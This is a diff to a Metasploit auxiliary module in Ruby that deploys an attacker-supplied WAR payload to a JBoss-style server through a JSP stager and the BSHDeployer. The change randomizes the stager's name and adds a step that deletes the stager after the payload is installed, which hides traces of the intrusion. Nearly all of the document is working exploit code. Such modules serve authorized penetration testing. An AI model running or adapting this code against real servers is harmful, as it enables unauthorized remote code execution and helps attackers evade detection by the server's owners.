@@ -41,12 +41,11 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(8080),
         OptString.new('APPBASE',    [ true,  'Application base name', 'payload']),
-        OptString.new('STAGERNAME', [ false, 'Only used if VERB is not POST', 'stager']),
         OptPath.new('WARFILE',      [ false, 'The WAR file to deploy'])
       ], self.class)
   end
 
-  def deploy_action(app_base, stager_name, war_data)
+  def deploy_action(app_base, war_data)
     encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
 
     if http_verb == 'POST'
@@ -57,6 +56,7 @@ class Metasploit3 < Msf::Auxiliary
       }
     else
       print_status("#{peer} - Deploying stager...")
+      stager_name = Rex::Text.rand_text_alpha(8 + rand(8))
       stager_contents = stager_jsp(app_base)
       opts = {
         :dir => "#{stager_name}.war",
@@ -78,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
     unless http_verb == 'POST'
       # call the stager to deploy our real payload war
       stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'
-      payload_data = "#{rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
+      payload_data = "#{Rex::Text.rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
       print_status("#{peer} - Calling stager #{stager_uri} to deploy final payload...")
       res = deploy('method' => 'POST',
                    'data'   => payload_data,
@@ -88,19 +88,28 @@ class Metasploit3 < Msf::Auxiliary
       else
         print_error("#{peer} - Failed to deploy final payload")
       end
+
+      # Remove the stager
+      print_status("#{peer} - Removing stager...")
+      files = {}
+      files[:stager_jsp_name] = "#{stager_name}.war/#{stager_name}.jsp"
+      files[:stager_base] = "#{stager_name}.war"
+      delete_script = generate_bsh(:delete, files)
+      res = deploy_package(delete_script, package)
+      if res.nil?
+        print_error("#{peer} - Unable to remove Stager")
+      else
+        print_good("#{peer} - Stager successfully removed")
+      end
     end
 
   end
 
-  def undeploy_action(app_base, stager_name)
+  def undeploy_action(app_base)
     # Undeploy the WAR and the stager if needed
     print_status("#{peer} - Undeploying #{app_base} by deleting the WAR file via BSHDeployer...")
 
     files = {}
-    unless stager_name.nil?
-      files[:stager_jsp_name] = "#{stager_name}.war/#{stager_name}.jsp"
-      files[:stager_base] = "#{stager_name}.war"
-    end
     files[:app_base] = "#{app_base}.war"
     delete_script = generate_bsh(:delete, files)
 
@@ -114,12 +123,6 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     app_base = datastore['APPBASE']
-    if http_verb == 'POST'
-      stager_name = nil
-    else
-      stager_name = datastore['STAGERNAME']
-      stager_name = "stager" if stager_name.blank?
-    end
 
     case action.name
     when 'Deploy'
@@ -127,9 +130,9 @@ class Metasploit3 < Msf::Auxiliary
         print_error("WAR file not found")
       end
       war_data = File.read(datastore['WARFILE'])
-      deploy_action(app_base, stager_name, war_data)
+      deploy_action(app_base, war_data)
     when 'Undeploy'
-      undeploy_action(app_base, stager_name)
+      undeploy_action(app_base)
     end
   end
 end
